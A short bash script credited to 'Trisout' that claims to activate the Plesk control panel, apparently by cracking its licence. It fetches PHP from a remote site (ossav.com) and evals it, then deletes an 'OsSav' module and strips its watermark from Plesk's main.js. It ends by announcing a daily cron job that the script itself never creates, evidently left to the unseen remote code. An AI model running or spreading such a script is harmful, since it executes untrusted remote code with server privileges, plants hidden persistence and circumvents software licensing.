echo "******************"
echo "Script by Trisout"
echo "******************"
echo "For support contact me on discord"
plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
systemctl stop psa
rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
fichier="/opt/psa/admin/cp/public/javascript/main.js"
if [ -e "$fichier" ]; then
    sed -i '/\/\*\* OsSav v1\.98 \*\*\//,/\/\*\* Fin de OsSav v1\.98 \*\*\//d' "$fichier"
    echo "Removed WaterMark"
else
    echo "An Error has occured when removing WaterMark. Please Relaunch the script"
fi
systemctl start psa
plesk bin extension --uninstall OsSav
echo "****************************************************"
echo "Your Plesk is now activated"
echo "A cron job has been created every day at 0:00 AM"
echo "****************************************************"
